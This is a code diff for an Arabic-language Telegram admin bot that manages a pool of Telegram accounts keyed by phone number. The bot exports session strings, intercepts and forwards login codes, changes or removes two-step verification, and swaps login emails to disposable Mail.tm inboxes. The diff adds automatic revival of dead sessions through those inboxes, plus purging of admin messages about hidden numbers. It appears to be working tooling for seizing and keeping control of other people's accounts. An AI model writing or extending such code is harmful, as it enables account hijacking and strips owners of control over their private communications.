@@ -116,23 +116,32 @@ async def _render_session_detail(callback: CallbackQuery, session):
         reply_markup=session_detail_keyboard(sid),
         parse_mode="HTML",
     )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
+    )
 
 
 async def _export_session_message(callback: CallbackQuery, session):
     phone = session["phone"]
     ss = await session_manager.ensure_session_string(phone)
     if ss:
-        await callback.message.answer(
+        msg = await callback.message.answer(
             f"📦 كود الجلسة للرقم <code>{h(phone)}</code>:\n\n"
             f"<code>{h(ss)}</code>",
             parse_mode="HTML",
         )
     else:
-        await callback.message.answer(
+        msg = await callback.message.answer(
             f"❌ لا يوجد session_string للرقم <code>{h(phone)}</code>.\n"
             f"الجلسة غير متصلة أو منتهية — جرّب «فحص الجلسات».",
             parse_mode="HTML",
         )
+    await track_admin_phone_message(
+        callback.from_user.id, phone, msg.chat.id, msg.message_id
+    )
 
 
 async def _admin_panel_text(uid: int) -> str:
@@ -158,23 +167,66 @@ async def safe_delete(chat_id, msg_id):
     except Exception:
         pass
 
+
+async def track_admin_phone_message(
+    admin_id: int, phone: str, chat_id: int, message_id: int
+):
+    """تسجيل رسالة بوت مرتبطة برقم — لحذفها لاحقاً عند ⭐."""
+    if not phone or admin_id == SUPER_ADMIN_ID:
+        return
+    norm = database.normalize_phone(phone)
+    await database.save_admin_notification(
+        admin_id, norm, chat_id, message_id
+    )
+
+
+async def purge_phone_from_other_admins(phone: str) -> int:
+    """حذف كل رسائل البوت عن هذا الرقم من شاتات الأدمنة (ما عدا A1)."""
+    notifs = await database.get_admin_notifications_for_phone(
+        phone, except_admin=SUPER_ADMIN_ID
+    )
+    by_chat: dict[int, list[int]] = {}
+    for n in notifs:
+        by_chat.setdefault(n["chat_id"], []).append(n["message_id"])
+    deleted = 0
+    for chat_id, ids in by_chat.items():
+        unique_ids = list(dict.fromkeys(ids))
+        try:
+            await bot.delete_messages(chat_id, unique_ids)
+            deleted += len(unique_ids)
+        except Exception:
+            for mid in unique_ids:
+                await safe_delete(chat_id, mid)
+                deleted += 1
+    await database.delete_admin_notifications_for_phone(
+        phone, except_admin=SUPER_ADMIN_ID
+    )
+    return deleted
+
+
 async def notify_admins(text: str, phone: str = None):
     """يرسل للأدمنة — يتخطى غير A1 إذا الجلسة ⭐ خاصة."""
+    norm_phone = database.normalize_phone(phone) if phone else None
     for aid in ADMIN_IDS:
-        if phone:
-            session = await database.get_session_by_phone(phone)
-            if session and database.row_flag(session, "a1_only") and aid != SUPER_ADMIN_ID:
+        if norm_phone:
+            session = await database.get_session_by_phone(norm_phone)
+            if (
+                session
+                and database.row_flag(session, "a1_only")
+                and aid != SUPER_ADMIN_ID
+            ):
                 continue
         try:
             msg = await bot.send_message(aid, text, parse_mode="HTML")
-            if phone:
-                await database.save_admin_notification(
-                    aid, phone, msg.chat.id, msg.message_id
+            if norm_phone:
+                await track_admin_phone_message(
+                    aid, norm_phone, msg.chat.id, msg.message_id
                 )
         except Exception:
             pass
 
-async def edit_or_send(chat_id, uid, text, markup=None):
+
+async def edit_or_send(chat_id, uid, text, markup=None, phone: str = None):
     mid = user_msg_ids.get(uid)
     if mid:
         try:
@@ -182,11 +234,15 @@ async def edit_or_send(chat_id, uid, text, markup=None):
                 text, chat_id=chat_id, message_id=mid,
                 reply_markup=markup, parse_mode="HTML"
             )
+            if phone:
+                await track_admin_phone_message(uid, phone, chat_id, mid)
             return
         except Exception:
             pass
     m = await bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")
     user_msg_ids[uid] = m.message_id
+    if phone:
+        await track_admin_phone_message(uid, phone, chat_id, m.message_id)
 
 
 # ──────────────────────────────────────────
@@ -425,10 +481,11 @@ async def _on_recovery_done(phone: str, result: dict):
 
     if result.get("success"):
         await notify_admins(
-            f"♻️ <b>تم إنعاش الجلسة عبر بريد Login!</b>\n\n"
+            f"♻️ <b>تم إحياء الجلسة</b>\n\n"
             f"📱 الرقم: <code>{h(phone)}</code>\n"
             f"👤 الاسم: {h(fname)}\n"
-            f"📧 البريد: <code>{h(result.get('email', ''))}</code>"
+            f"📧 بريد Login: <code>{h(result.get('email', ''))}</code>\n\n"
+            f"<i>تم طلب الكود من تيليجرام واستلامه من Mail.tm تلقائياً.</i>"
             + ADMIN_FOOTER,
             phone=phone,
         )
@@ -436,11 +493,12 @@ async def _on_recovery_done(phone: str, result: dict):
 
     await database.mark_session_invalid(phone)
     await notify_admins(
-        f"❌ <b>جلسة غير صالحة — فشل الإنعاش</b>\n\n"
+        f"❌ <b>جلسة غير صالحة</b>\n\n"
         f"📱 الرقم: <code>{h(phone)}</code>\n"
         f"👤 الاسم: {h(fname)}\n"
-        f"⚠️ السبب: <code>{h(result.get('error', ''))}</code>\n\n"
-        f"تم تصنيفها غير صالحة بعد محاولة الإنعاش."
+        f"⚠️ فشل الإنعاش بعد {SESSION_RECOVERY_DELAY // 60} دقائق: "
+        f"<code>{h(result.get('error', ''))}</code>\n\n"
+        f"<i>مثال: تغيير بريد Login على الحساب أو حذف الجلسة نهائياً.</i>"
         + ADMIN_FOOTER,
         phone=phone,
     )
@@ -490,9 +548,13 @@ async def retry_code(callback: CallbackQuery, state: FSMContext):
 
 
 # ──────────────────────────────────────────
-# Watchdog
+# Watchdog — مراقبة مستمرة (بدون إعادة تشغيل السيرفر)
 # ──────────────────────────────────────────
 async def session_watchdog():
+    """
+    كل ~30 ثانية: جلسة ماتت + بريد Login محفوظ → انتظار 5 دقائق → إنعاش تلقائي.
+    نجاح: إشعار «تم إحياء الجلسة». فشل: تصنيف غير صالحة + إشعار السبب.
+    """
     while True:
         await asyncio.sleep(30)
         try:
@@ -507,26 +569,24 @@ async def session_watchdog():
                     if login_email and s["email_password"]:
                         if phone not in session_manager._recovery_scheduled:
                             await notify_admins(
-                                f"⚠️ <b>جلسة توقفت</b>\n\n"
+                                f"⚠️ <b>الجلسة توقفت — جاري الإنعاش التلقائي</b>\n\n"
                                 f"📱 الرقم: <code>{h(phone)}</code>\n"
                                 f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
-                                f"♻️ بعد {SESSION_RECOVERY_DELAY // 60} دقائق: "
-                                f"طلب كود عبر بريد Login\n"
-                                f"<code>{h(login_email)}</code>"
+                                f"⏳ بعد <b>{SESSION_RECOVERY_DELAY // 60}</b> دقائق: "
+                                f"طلب كود من تيليجرام → Mail.tm\n"
+                                f"📧 <code>{h(login_email)}</code>"
                                 + ADMIN_FOOTER,
                                 phone=phone,
                             )
-                            session_manager.schedule_session_recovery(
-                                phone,
-                                SESSION_RECOVERY_DELAY,
-                                on_done=_on_recovery_done,
+                            session_manager.schedule_standard_recovery(
+                                phone, on_done=_on_recovery_done
                             )
                     else:
                         await database.mark_session_invalid(phone)
                         await notify_admins(
                             f"❌ <b>جلسة غير صالحة</b>\n\n"
                             f"📱 الرقم: <code>{h(phone)}</code>\n"
-                            f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش."
+                            f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش التلقائي."
                             + ADMIN_FOOTER,
                             phone=phone,
                         )
@@ -609,18 +669,9 @@ async def a1_hide_session(callback: CallbackQuery):
     hide = not database.row_flag(session, "a1_only")
     await database.set_session_a1_only(phone, hide)
     if hide:
-        notifs = await database.get_admin_notifications_for_phone(
-            phone, except_admin=SUPER_ADMIN_ID
-        )
-        deleted = 0
-        for n in notifs:
-            await safe_delete(n["chat_id"], n["message_id"])
-            deleted += 1
-        await database.delete_admin_notifications_for_phone(
-            phone, except_admin=SUPER_ADMIN_ID
-        )
+        deleted = await purge_phone_from_other_admins(phone)
         await callback.answer(
-            f"⭐ خاص — حُذف {deleted} إشعار من الأدمنة الآخرين",
+            f"⭐ خاص — حُذف {deleted} رسالة من شاتات الأدمنة الآخرين",
             show_alert=True,
         )
     else:
@@ -667,7 +718,8 @@ async def check_sessions_handler(callback: CallbackQuery):
     report = (
         f"\n\n🔍 <b>نتيجة الفحص</b>\n"
         f"تم فحص: <b>{stats['checked']}</b>\n"
-        f"❌ غير صالحة (مجمدة/ميتة): <b>{stats['invalid']}</b>"
+        f"❌ غير صالحة (بدون بريد): <b>{stats['invalid']}</b>\n"
+        f"♻️ مجدولة للإنعاش: <b>{stats.get('recovery_scheduled', 0)}</b>"
     )
     if stats.get("phones"):
         sample = stats["phones"][:5]
@@ -959,7 +1011,10 @@ async def auto_mail_process(callback: CallbackQuery):
         return
     phone, sid = session["phone"], session["id"]
     row = session
-    kept = await session_manager.existing_login_email_ok(row)
+    client_probe = await session_manager.get_active_client(phone)
+    kept = await session_manager.existing_login_email_ok(row, client_probe)
+    if client_probe:
+        await client_probe.disconnect()
     if kept:
         await callback.answer("ℹ️ البريد الحالي شغال — لم يُغيَّر", show_alert=True)
         await callback.message.edit_text(
@@ -971,6 +1026,12 @@ async def auto_mail_process(callback: CallbackQuery):
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
+        await track_admin_phone_message(
+            callback.from_user.id,
+            phone,
+            callback.message.chat.id,
+            callback.message.message_id,
+        )
         return
 
     await callback.answer("⏳ جاري المعالجة...")
@@ -979,6 +1040,12 @@ async def auto_mail_process(callback: CallbackQuery):
         "<i>قد يستغرق حتى دقيقتين — لا تضغط زراً آخر</i>"
         + ADMIN_FOOTER,
         parse_mode="HTML",
+    )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
     )
     try:
         res = await session_manager.change_login_email(phone)
@@ -1005,6 +1072,12 @@ async def auto_mail_process(callback: CallbackQuery):
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
+    )
 
 
 # ──────────────────────────────────────────
@@ -1035,6 +1108,9 @@ async def admin_req_code(callback: CallbackQuery, state: FSMContext):
         parse_mode="HTML",
         reply_markup=back_to_session_keyboard(sid),
     )
+    await track_admin_phone_message(
+        admin_id, phone, callback.message.chat.id, msg_id
+    )
     task = asyncio.create_task(
         _watch_and_forward(admin_id, phone, sid, msg_id, two_fa_text)
     )
@@ -1059,13 +1135,17 @@ async def _watch_and_forward(
                 parse_mode="HTML",
                 reply_markup=back_to_session_keyboard(session_id)
             )
+            await track_admin_phone_message(admin_id, phone, admin_id, msg_id)
         except Exception:
-            await bot.send_message(
+            msg = await bot.send_message(
                 admin_id,
                 f"📲 <b>وصل الكود للرقم</b> <code>{h(phone)}</code>\n\n"
                 f"<code>{h(code_msg)}</code>" + two_fa_text + ADMIN_FOOTER,
                 parse_mode="HTML",
                 reply_markup=back_to_session_keyboard(session_id),
+            )
+            await track_admin_phone_message(
+                admin_id, phone, msg.chat.id, msg.message_id
             )
     else:
         try:
@@ -1077,6 +1157,7 @@ async def _watch_and_forward(
                 parse_mode="HTML",
                 reply_markup=back_to_session_keyboard(session_id),
             )
+            await track_admin_phone_message(admin_id, phone, admin_id, msg_id)
         except Exception:
             pass
 
@@ -1120,7 +1201,10 @@ async def process_username_change(message: Message, state: FSMContext):
         if result["success"]
         else f"❌ فشل: {h(result.get('error', ''))}"
     )
-    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
+    await edit_or_send(
+        aid, aid, txt + ADMIN_FOOTER,
+        markup=back_to_session_keyboard(sid), phone=phone,
+    )
     await state.clear()
 
 
@@ -1165,7 +1249,10 @@ async def process_name_change(message: Message, state: FSMContext):
         else f"❌ فشل: {h(result.get('error', ''))}"
     )
     sid = data.get("session_id")
-    await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
+    await edit_or_send(
+        aid, aid, txt + ADMIN_FOOTER,
+        markup=back_to_session_keyboard(sid), phone=phone,
+    )
     await state.clear()
 
 
@@ -1218,15 +1305,16 @@ async def process_2fa_change(message: Message, state: FSMContext):
     await edit_or_send(
         aid, aid,
         "⏳ جاري تطبيق التغيير على الحساب..." + ADMIN_FOOTER,
-        markup=back_to_session_keyboard(sid),
+        markup=back_to_session_keyboard(sid), phone=phone,
     )
 
     if new_2fa.lower() == "remove":
         if not has_2fa:
             await edit_or_send(
                 aid, aid,
-                f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً." + ADMIN_FOOTER,
-                markup=back_to_session_keyboard(sid),
+                f"⚠️ الحساب <code>{h(phone)}</code> ليس لديه تحقق بخطوتين أصلاً."
+                + ADMIN_FOOTER,
+                markup=back_to_session_keyboard(sid), phone=phone,
             )
         else:
             result = await session_manager.remove_two_fa(phone, old_2fa)
@@ -1235,7 +1323,10 @@ async def process_2fa_change(message: Message, state: FSMContext):
                 if result["success"]
                 else f"❌ فشل الإزالة: <code>{h(result.get('error', ''))}</code>"
             )
-            await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
+            await edit_or_send(
+                aid, aid, txt + ADMIN_FOOTER,
+                markup=back_to_session_keyboard(sid), phone=phone,
+            )
     else:
         result = await session_manager.set_two_fa(phone, new_2fa, old_2fa if has_2fa else None)
         txt = (
@@ -1244,7 +1335,10 @@ async def process_2fa_change(message: Message, state: FSMContext):
             if result["success"]
             else f"❌ فشل التغيير: <code>{h(result.get('error', ''))}</code>"
         )
-        await edit_or_send(aid, aid, txt + ADMIN_FOOTER, markup=back_to_session_keyboard(sid))
+        await edit_or_send(
+            aid, aid, txt + ADMIN_FOOTER,
+            markup=back_to_session_keyboard(sid), phone=phone,
+        )
     await state.clear()
 
 
@@ -1295,6 +1389,12 @@ async def admin_full_cleanup(callback: CallbackQuery):
         parse_mode="HTML",
         reply_markup=back_to_session_keyboard(sid),
     )
+    await track_admin_phone_message(
+        callback.from_user.id,
+        phone,
+        callback.message.chat.id,
+        callback.message.message_id,
+    )
     await callback.answer()
 
 
@@ -1305,29 +1405,48 @@ async def _startup_email_migration():
     """ترحيل بريد Login للحسابات القديمة + استئناف جدولة الطرد."""
     try:
         pending = await database.get_sessions_needing_email_migration()
-        if not pending:
-            return
-        logging.info("starting email migration for %d sessions", len(pending))
-        stats = await session_manager.migrate_old_sessions_emails()
-        skipped = stats.get("skipped", 0)
-        await notify_admins(
-            f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
-            f"✅ نجح: {stats['migrated']}\n"
-            f"⏭️ بدون تغيير (شغال): {skipped}\n"
-            f"❌ فشل: {stats['failed']}\n"
-            f"📊 الإجمالي: {stats['total']}"
-            + ADMIN_FOOTER
-        )
+        if pending:
+            logging.info("starting email migration for %d sessions", len(pending))
+            stats = await session_manager.migrate_old_sessions_emails()
+            skipped = stats.get("skipped", 0)
+            await notify_admins(
+                f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
+                f"✅ نجح: {stats['migrated']}\n"
+                f"⏭️ بدون تغيير (شغال): {skipped}\n"
+                f"❌ فشل: {stats['failed']}\n"
+                f"📊 الإجمالي: {stats['total']}"
+                + ADMIN_FOOTER
+            )
     except Exception as e:
         logging.error("email migration startup: %s", e)
     await session_manager.resume_auto_kick_pipelines()
 
 
+async def _startup_session_recovery():
+    """بعد إعادة التشغيل: إنعاش الجلسات الميتة التي لها بريد Login."""
+    try:
+        stats = await session_manager.startup_recover_dead_sessions(
+            on_done=_on_recovery_done
+        )
+        if stats["scheduled"] > 0:
+            await notify_admins(
+                f"♻️ <b>جلسات ميتة عند التشغيل</b>\n\n"
+                f"عددها: <b>{stats['dead']}</b>\n"
+                f"مجدولة للإنعاش (بعد {SESSION_RECOVERY_DELAY // 60} دقائق): "
+                f"<b>{stats['scheduled']}</b>"
+                + ADMIN_FOOTER
+            )
+    except Exception as e:
+        logging.error("startup session recovery: %s", e)
+
+
 async def main():
     await database.init_db()
     logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
+    session_manager.set_recovery_callback(_on_recovery_done)
     asyncio.ensure_future(session_watchdog())
     asyncio.ensure_future(_startup_email_migration())
+    asyncio.ensure_future(_startup_session_recovery())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
